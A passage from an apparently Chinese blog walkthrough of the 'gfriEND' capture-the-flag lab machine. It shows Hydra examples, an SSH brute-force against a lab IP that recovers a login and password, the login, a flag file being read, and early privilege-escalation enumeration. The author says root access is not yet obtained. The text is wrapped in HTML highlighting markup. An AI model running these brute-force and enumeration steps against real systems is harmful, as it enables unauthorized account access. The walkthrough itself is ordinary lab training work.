[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at http://www.thc.org/thc-hydra
Don</span><span class="dl">'</span><span class="nx">t</span> <span class="nx">use</span> <span class="k">in</span> <span class="nx">military</span> <span class="nx">or</span> <span class="nx">secret</span> <span class="nx">service</span> <span class="nx">organizations</span><span class="p">,</span> <span class="nx">or</span> <span class="k">for</span> <span class="nx">illegal</span> <span class="nx">purposes</span><span class="p">.</span>
<span class="nx">These</span> <span class="nx">services</span> <span class="nx">were</span> <span class="nx">not</span> <span class="nx">compiled</span> <span class="k">in</span><span class="p">:</span> <span class="nx">afp</span> <span class="nx">ncp</span> <span class="nx">oracle</span> <span class="nx">sapr3</span><span class="p">.</span>

<span class="nx">Use</span> <span class="nx">HYDRA_PROXY_HTTP</span> <span class="nx">or</span> <span class="nx">HYDRA_PROXY</span> <span class="nx">environment</span> <span class="nx">variables</span> <span class="k">for</span> <span class="nx">a</span> <span class="nx">proxy</span> <span class="nx">setup</span><span class="p">.</span>
<span class="nx">E</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="o">%</span> <span class="k">export</span> <span class="nx">HYDRA_PROXY</span><span class="o">=</span><span class="nx">socks5</span><span class="p">:</span><span class="c1">//l:p@127.0.0.1:9150 (or: socks4:// connect://)</span>
     <span class="o">%</span> <span class="k">export</span> <span class="nx">HYDRA_PROXY</span><span class="o">=</span><span class="nx">connect_and_socks_proxylist</span><span class="p">.</span><span class="nx">txt</span>  <span class="p">(</span><span class="nx">up</span> <span class="nx">to</span> <span class="mi">64</span> <span class="nx">entries</span><span class="p">)</span>
     <span class="o">%</span> <span class="k">export</span> <span class="nx">HYDRA_PROXY_HTTP</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//login:pass@proxy:8080</span>
     <span class="o">%</span> <span class="k">export</span> <span class="nx">HYDRA_PROXY_HTTP</span><span class="o">=</span><span class="nx">proxylist</span><span class="p">.</span><span class="nx">txt</span>  <span class="p">(</span><span class="nx">up</span> <span class="nx">to</span> <span class="mi">64</span> <span class="nx">entries</span><span class="p">)</span>

<span class="nx">Examples</span><span class="p">:</span>
  <span class="nx">hydra</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">user</span> <span class="o">-</span><span class="nx">P</span> <span class="nx">passlist</span><span class="p">.</span><span class="nx">txt</span> <span class="nx">ftp</span><span class="p">:</span><span class="c1">//192.168.0.1</span>
  <span class="nx">hydra</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">userlist</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">defaultpw</span> <span class="nx">imap</span><span class="p">:</span><span class="c1">//192.168.0.1/PLAIN</span>
  <span class="nx">hydra</span> <span class="o">-</span><span class="nx">C</span> <span class="nx">defaults</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="mi">6</span> <span class="nx">pop3s</span><span class="p">:</span><span class="c1">//[2001:db8::1]:143/TLS:DIGEST-MD5</span>
  <span class="nx">hydra</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">admin</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">password</span> <span class="nx">ftp</span><span class="p">:</span><span class="c1">//[192.168.0.0/24]/</span>
  <span class="nx">hydra</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">logins</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">P</span> <span class="nx">pws</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">M</span> <span class="nx">targets</span><span class="p">.</span><span class="nx">txt</span> <span class="nx">ssh</span>
</code></pre></div></div>
<p>根据上面的爆破命令，编写爆破命令，代码过程如下：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">hydra</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">user</span> <span class="o">-</span><span class="nx">P</span> <span class="nx">pass</span> <span class="nx">ssh</span><span class="p">:</span><span class="c1">//192.168.3.59</span>
<span class="nx">Hydra</span> <span class="nx">v8</span><span class="p">.</span><span class="mi">6</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="mi">2017</span> <span class="nx">by</span> <span class="nx">van</span> <span class="nx">Hauser</span><span class="o">/</span><span class="nx">THC</span> <span class="o">-</span> <span class="nx">Please</span> <span class="k">do</span> <span class="nx">not</span> <span class="nx">use</span> <span class="k">in</span> <span class="nx">military</span> <span class="nx">or</span> <span class="nx">secret</span> <span class="nx">service</span> <span class="nx">organizations</span><span class="p">,</span> <span class="nx">or</span> <span class="k">for</span> <span class="nx">illegal</span> <span class="nx">purposes</span><span class="p">.</span>

<span class="nx">Hydra</span> <span class="p">(</span><span class="nx">http</span><span class="p">:</span><span class="c1">//www.thc.org/thc-hydra) starting at 2020-01-08 09:56:30</span>
<span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">Many</span> <span class="nx">SSH</span> <span class="nx">configurations</span> <span class="nx">limit</span> <span class="nx">the</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">parallel</span> <span class="nx">tasks</span><span class="p">,</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">recommended</span> <span class="nx">to</span> <span class="nx">reduce</span> <span class="nx">the</span> <span class="nx">tasks</span><span class="p">:</span> <span class="nx">use</span> <span class="o">-</span><span class="nx">t</span> <span class="mi">4</span>
<span class="p">[</span><span class="nx">DATA</span><span class="p">]</span> <span class="nx">max</span> <span class="mi">16</span> <span class="nx">tasks</span> <span class="nx">per</span> <span class="mi">1</span> <span class="nx">server</span><span class="p">,</span> <span class="nx">overall</span> <span class="mi">16</span> <span class="nx">tasks</span><span class="p">,</span> <span class="mi">36</span> <span class="nx">login</span> <span class="nx">tries</span> <span class="p">(</span><span class="nx">l</span><span class="p">:</span><span class="mi">6</span><span class="o">/</span><span class="nx">p</span><span class="p">:</span><span class="mi">6</span><span class="p">),</span> <span class="o">~</span><span class="mi">3</span> <span class="nx">tries</span> <span class="nx">per</span> <span class="nx">task</span>
<span class="p">[</span><span class="nx">DATA</span><span class="p">]</span> <span class="nx">attacking</span> <span class="nx">ssh</span><span class="p">:</span><span class="c1">//192.168.3.59:22/</span>
<span class="p">[</span><span class="mi">22</span><span class="p">][</span><span class="nx">ssh</span><span class="p">]</span> <span class="nx">host</span><span class="p">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.59</span>   <span class="nx">login</span><span class="p">:</span> <span class="nx">alice</span>   <span class="nx">password</span><span class="p">:</span> <span class="mi">4</span><span class="nx">lic3</span>
<span class="mi">1</span> <span class="k">of</span> <span class="mi">1</span> <span class="nx">target</span> <span class="nx">successfully</span> <span class="nx">completed</span><span class="p">,</span> <span class="mi">1</span> <span class="nx">valid</span> <span class="nx">password</span> <span class="nx">found</span>
<span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">Writing</span> <span class="nx">restore</span> <span class="nx">file</span> <span class="nx">because</span> <span class="mi">4</span> <span class="nx">final</span> <span class="nx">worker</span> <span class="nx">threads</span> <span class="nx">did</span> <span class="nx">not</span> <span class="nx">complete</span> <span class="nx">until</span> <span class="nx">end</span><span class="p">.</span>
<span class="p">[</span><span class="nx">ERROR</span><span class="p">]</span> <span class="mi">4</span> <span class="nx">targets</span> <span class="nx">did</span> <span class="nx">not</span> <span class="nx">resolve</span> <span class="nx">or</span> <span class="nx">could</span> <span class="nx">not</span> <span class="nx">be</span> <span class="nx">connected</span>
<span class="p">[</span><span class="nx">ERROR</span><span class="p">]</span> <span class="mi">16</span> <span class="nx">targets</span> <span class="nx">did</span> <span class="nx">not</span> <span class="nx">complete</span>
<span class="nx">Hydra</span> <span class="p">(</span><span class="nx">http</span><span class="p">:</span><span class="c1">//www.thc.org/thc-hydra) finished at 2020-01-08 09:56:35</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span>            
</code></pre></div></div>
<p>如上爆破出ssh服务密码:<code class="language-plaintext highlighter-rouge">[22][ssh] host: 192.168.3.59   login: alice   password: 4lic3</code>
<br />直接ssh连接：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">本阿信</span><span class="o">&gt;</span><span class="nx">ssh</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.59</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">alice</span>
<span class="nx">Could</span> <span class="nx">not</span> <span class="nx">create</span> <span class="nx">directory</span> <span class="dl">'</span><span class="s1">C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\\</span><span class="s1">346</span><span class="se">\</span><span class="s1">234</span><span class="se">\</span><span class="s1">254</span><span class="se">\</span><span class="s1">351</span><span class="se">\</span><span class="s1">230</span><span class="se">\</span><span class="s1">277</span><span class="se">\</span><span class="s1">344</span><span class="se">\</span><span class="s1">277</span><span class="se">\</span><span class="s1">241/.ssh</span><span class="dl">'</span><span class="p">.</span>
<span class="nx">The</span> <span class="nx">authenticity</span> <span class="k">of</span> <span class="nx">host</span> <span class="dl">'</span><span class="s1">192.168.3.59 (192.168.3.59)</span><span class="dl">'</span> <span class="nx">can</span><span class="dl">'</span><span class="s1">t be established.
ECDSA key fingerprint is SHA256:lE5D8AvkJqcIwHiNuI9aSnC3ohlDrhPhjDljqSDy9sY.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (C:</span><span class="se">\\</span><span class="s1">Users</span><span class="se">\\\</span><span class="s1">346</span><span class="se">\</span><span class="s1">234</span><span class="se">\</span><span class="s1">254</span><span class="se">\</span><span class="s1">351</span><span class="se">\</span><span class="s1">230</span><span class="se">\</span><span class="s1">277</span><span class="se">\</span><span class="s1">344</span><span class="se">\</span><span class="s1">277</span><span class="se">\</span><span class="s1">241/.ssh/known_hosts).
alice@192.168.3.59</span><span class="dl">'</span><span class="nx">s</span> <span class="nx">password</span><span class="p">:</span>
<span class="nx">Last</span> <span class="nx">login</span><span class="p">:</span> <span class="nx">Fri</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">14</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">25</span> <span class="mi">2019</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">id</span>
<span class="nx">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="nx">alice</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">alice</span><span class="p">)</span> <span class="nx">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="nx">alice</span><span class="p">)</span>
</code></pre></div></div>

<h1 id="尝试提权">尝试提权</h1>

<p>靶机还没搞完，ssh连上就按套路查看了一下当前user可写的文件，查看到一些有趣的东西，但由于最近好多事，还没有搞到机器root，待更新。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">find</span> <span class="o">/</span> <span class="o">-</span><span class="nx">writable</span> <span class="o">-</span><span class="nx">type</span> <span class="nx">d</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/</span><span class="kc">null</span>
<span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">alice</span>
<span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">alice</span><span class="o">/</span><span class="p">.</span><span class="nx">cache</span>
<span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">alice</span><span class="o">/</span><span class="p">.</span><span class="nx">my_secret</span>
<span class="o">/</span><span class="nx">run</span><span class="o">/</span><span class="nx">user</span><span class="o">/</span><span class="mi">1000</span>
<span class="o">/</span><span class="nx">run</span><span class="o">/</span><span class="nx">shm</span>
<span class="o">/</span><span class="nx">run</span><span class="o">/</span><span class="nx">lock</span>
<span class="o">/</span><span class="nx">tmp</span>
<span class="o">/</span><span class="kd">var</span><span class="sr">/lib/</span><span class="nx">php5</span>
<span class="o">/</span><span class="kd">var</span><span class="sr">/cras</span><span class="err">h
</span><span class="o">/</span><span class="kd">var</span><span class="sr">/tm</span><span class="err">p
</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1591</span><span class="o">/</span><span class="nx">task</span><span class="o">/</span><span class="mi">1591</span><span class="o">/</span><span class="nx">fd</span>
<span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1591</span><span class="o">/</span><span class="nx">fd</span>
<span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1591</span><span class="o">/</span><span class="nx">map_files</span>
<span class="o">/</span><span class="nx">sys</span><span class="o">/</span><span class="nx">fs</span><span class="o">/</span><span class="nx">cgroup</span><span class="o">/</span><span class="nx">systemd</span><span class="o">/</span><span class="nx">user</span><span class="o">/</span><span class="mi">1000</span><span class="p">.</span><span class="nx">user</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="nx">session</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">cd</span> <span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">alice</span><span class="o">/</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">cat</span> <span class="p">.</span><span class="nx">my_secret</span><span class="o">/</span>
<span class="nx">cat</span><span class="p">:</span> <span class="p">.</span><span class="nx">my_secret</span><span class="o">/</span><span class="p">:</span> <span class="nx">Is</span> <span class="nx">a</span> <span class="nx">directory</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">cd</span> <span class="p">.</span><span class="nx">my_secret</span><span class="o">/</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="sr">/.my_secret$ l</span><span class="err">s
</span><span class="nx">flag1</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">my_notes</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="sr">/.my_secret$ ls -l</span><span class="err">a
</span><span class="nx">total</span> <span class="mi">16</span>
<span class="nx">drwxrwxr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">2</span> <span class="nx">alice</span> <span class="nx">alice</span> <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">14</span><span class="p">:</span><span class="mi">10</span> <span class="p">.</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">4</span> <span class="nx">alice</span> <span class="nx">alice</span> <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">14</span><span class="p">:</span><span class="mi">47</span> <span class="p">..</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">root</span>  <span class="nx">root</span>   <span class="mi">306</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">13</span><span class="p">:</span><span class="mi">04</span> <span class="nx">flag1</span><span class="p">.</span><span class="nx">txt</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span> <span class="mi">1</span> <span class="nx">alice</span> <span class="nx">alice</span>  <span class="mi">119</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">12</span><span class="p">:</span><span class="mi">23</span> <span class="nx">my_notes</span><span class="p">.</span><span class="nx">txt</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="sr">/.my_secret$ cat flag1.tx</span><span class="err">t
</span><span class="nx">Greattttt</span> <span class="nx">my</span> <span class="nx">brother</span><span class="o">!</span> <span class="nx">You</span> <span class="nx">saw</span> <span class="nx">the</span> <span class="nx">Alice</span><span class="dl">'</span><span class="s1">s note! Now you save the record information to give to bob! 
I know if it</span><span class="dl">'</span><span class="nx">s</span> <span class="nx">given</span> <span class="nx">to</span> <span class="nx">him</span> <span class="nx">then</span> <span class="nx">Bob</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">hurt</span> <span class="nx">but</span> <span class="k">this</span> <span class="nx">is</span> <span class="nx">better</span> <span class="nx">than</span> <span class="nx">Bob</span> <span class="nx">cheated</span><span class="o">!</span>

<span class="nx">Now</span> <span class="nx">your</span> <span class="nx">last</span> <span class="nx">job</span> <span class="nx">is</span> <span class="kd">get</span> <span class="nx">access</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">root</span> <span class="nx">and</span> <span class="nx">read</span> <span class="nx">the</span> <span class="nx">flag</span> <span class="o">^</span><span class="nx">_</span><span class="o">^</span>

<span class="nx">Flag</span> <span class="mi">1</span> <span class="p">:</span> <span class="nx">gfriEND</span><span class="p">{</span><span class="mi">2</span><span class="nx">f5f21b2af1b8c3e227bcf35544f8f09</span><span class="p">}</span>

<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="sr">/.my_secret$ cat my_notes.tx</span><span class="err">t
</span><span class="nx">Woahhh</span><span class="o">!</span> <span class="nx">I</span> <span class="nx">like</span> <span class="k">this</span> <span class="nx">company</span><span class="p">,</span> <span class="nx">I</span> <span class="nx">hope</span> <span class="nx">that</span> <span class="nx">here</span> <span class="nx">i</span> <span class="kd">get</span> <span class="nx">a</span> <span class="nx">better</span> <span class="nx">partner</span> <span class="nx">than</span> <span class="nx">bob</span> <span class="o">^</span><span class="nx">_</span><span class="o">^</span><span class="p">,</span> 
<span class="nx">hopefully</span> <span class="nx">Bob</span> <span class="nx">doesn</span><span class="dl">'</span><span class="s1">t know my notes
</span></code></pre></div></div>
<p>各种姿势尝试：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="sr">/.my_secret$ cd .</span><span class="err">.
</span><span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">l</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">ls</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">~</span><span class="nx">$</span> <span class="nx">cd</span> <span class="p">..</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">home$</span> <span class="nx">ls</span>
<span class="nx">aingmaung</span>  <span class="nx">alice</span>  <span class="nx">eweuhtandingan</span>  <span class="nx">sundatea</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">home$</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">la</span>
<span class="nx">total</span> <span class="mi">24</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>  <span class="mi">6</span> <span class="nx">root</span>           <span class="nx">root</span>           <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">12</span><span class="p">:</span><span class="mi">18</span> <span class="p">.</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">22</span> <span class="nx">root</span>           <span class="nx">root</span>           <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">10</span><span class="p">:</span><span class="mi">21</span> <span class="p">..</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>  <span class="mi">2</span> <span class="nx">aingmaung</span>      <span class="nx">aingmaung</span>      <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">12</span><span class="p">:</span><span class="mi">18</span> <span class="nx">aingmaung</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>  <span class="mi">4</span> <span class="nx">alice</span>          <span class="nx">alice</span>          <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">14</span><span class="p">:</span><span class="mi">47</span> <span class="nx">alice</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>  <span class="mi">2</span> <span class="nx">eweuhtandingan</span> <span class="nx">eweuhtandingan</span> <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">12</span><span class="p">:</span><span class="mi">18</span> <span class="nx">eweuhtandingan</span>
<span class="nx">drwxr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>  <span class="mi">2</span> <span class="nx">sundatea</span>       <span class="nx">sundatea</span>       <span class="mi">4096</span> <span class="nx">Dec</span> <span class="mi">13</span> <span class="mi">12</span><span class="p">:</span><span class="mi">18</span> <span class="nx">sundatea</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">home$</span> <span class="nx">cd</span> <span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1591</span><span class="o">/</span><span class="nx">map_files</span>
<span class="o">-</span><span class="nx">bash</span><span class="p">:</span> <span class="nx">cd</span><span class="p">:</span> <span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1591</span><span class="o">/</span><span class="nx">map_files</span><span class="p">:</span> <span class="nx">No</span> <span class="nx">such</span> <span class="nx">file</span> <span class="nx">or</span> <span class="nx">directory</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">home$</span> <span class="nx">ls</span>
<span class="nx">aingmaung</span>  <span class="nx">alice</span>  <span class="nx">eweuhtandingan</span>  <span class="nx">sundatea</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">home$</span> <span class="nx">cd</span> <span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1592</span><span class="o">/</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1592</span><span class="nx">$</span> <span class="nx">ls</span>
<span class="nx">ls</span><span class="p">:</span> <span class="nx">cannot</span> <span class="nx">read</span> <span class="nx">symbolic</span> <span class="nx">link</span> <span class="nx">cwd</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">ls</span><span class="p">:</span> <span class="nx">cannot</span> <span class="nx">read</span> <span class="nx">symbolic</span> <span class="nx">link</span> <span class="nx">root</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">ls</span><span class="p">:</span> <span class="nx">cannot</span> <span class="nx">read</span> <span class="nx">symbolic</span> <span class="nx">link</span> <span class="nx">exe</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">attr</span>        <span class="nx">comm</span>             <span class="nx">fd</span>        <span class="nx">map_files</span>   <span class="nx">net</span>            <span class="nx">pagemap</span>      <span class="nx">sessionid</span>  <span class="nx">status</span>
<span class="nx">autogroup</span>   <span class="nx">coredump_filter</span>  <span class="nx">fdinfo</span>    <span class="nx">maps</span>        <span class="nx">ns</span>             <span class="nx">personality</span>  <span class="nx">setgroups</span>  <span class="nx">syscall</span>
<span class="nx">auxv</span>        <span class="nx">cpuset</span>           <span class="nx">gid_map</span>   <span class="nx">mem</span>         <span class="nx">numa_maps</span>      <span class="nx">projid_map</span>   <span class="nx">smaps</span>      <span class="nx">task</span>
<span class="nx">cgroup</span>      <span class="nx">cwd</span>              <span class="nx">io</span>        <span class="nx">mountinfo</span>   <span class="nx">oom_adj</span>        <span class="nx">root</span>         <span class="nx">stack</span>      <span class="nx">timers</span>
<span class="nx">clear_refs</span>  <span class="nx">environ</span>          <span class="nx">limits</span>    <span class="nx">mounts</span>      <span class="nx">oom_score</span>      <span class="nx">sched</span>        <span class="nx">stat</span>       <span class="nx">uid_map</span>
<span class="nx">cmdline</span>     <span class="nx">exe</span>              <span class="nx">loginuid</span>  <span class="nx">mountstats</span>  <span class="nx">oom_score_adj</span>  <span class="nx">schedstat</span>    <span class="nx">statm</span>      <span class="nx">wchan</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1592</span><span class="nx">$</span> <span class="nx">cat</span> <span class="nx">map_files</span><span class="o">/</span>
<span class="nx">cat</span><span class="p">:</span> <span class="nx">map_files</span><span class="o">/</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">alice</span><span class="p">@</span><span class="nd">gfriEND</span><span class="p">:</span><span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1592</span><span class="nx">$</span> <span class="nx">ls</span> <span class="o">-</span><span class="nx">la</span>
<span class="nx">ls</span><span class="p">:</span> <span class="nx">cannot</span> <span class="nx">read</span> <span class="nx">symbolic</span> <span class="nx">link</span> <span class="nx">cwd</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">ls</span><span class="p">:</span> <span class="nx">cannot</span> <span class="nx">read</span> <span class="nx">symbolic</span> <span class="nx">link</span> <span class="nx">root</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">ls</span><span class="p">:</span> <span class="nx">cannot</span> <span class="nx">read</span> <span class="nx">symbolic</span> <span class="nx">link</span> <span class="nx">exe</span><span class="p">:</span> <span class="nx">Permission</span> <span class="nx">denied</span>
<span class="nx">total</span> <span class="mi">0</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>   <span class="mi">9</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="p">.</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span> <span class="mi">102</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">16</span><span class="p">:</span><span class="mi">29</span> <span class="p">..</span>
<span class="nx">dr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">xr</span><span class="o">-</span><span class="nx">x</span>   <span class="mi">2</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">attr</span>
<span class="o">-</span><span class="nx">rw</span><span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">autogroup</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">auxv</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">cgroup</span>
<span class="o">--</span><span class="nx">w</span><span class="o">-------</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">clear_refs</span>
<span class="o">-</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="nx">root</span> <span class="nx">root</span> <span class="mi">0</span> <span class="nx">Jan</span>  <span class="mi">8</span> <span class="mi">17</span><span class="p">:</span><span class="mi">01</span> <span class="nx">cmdline</span>
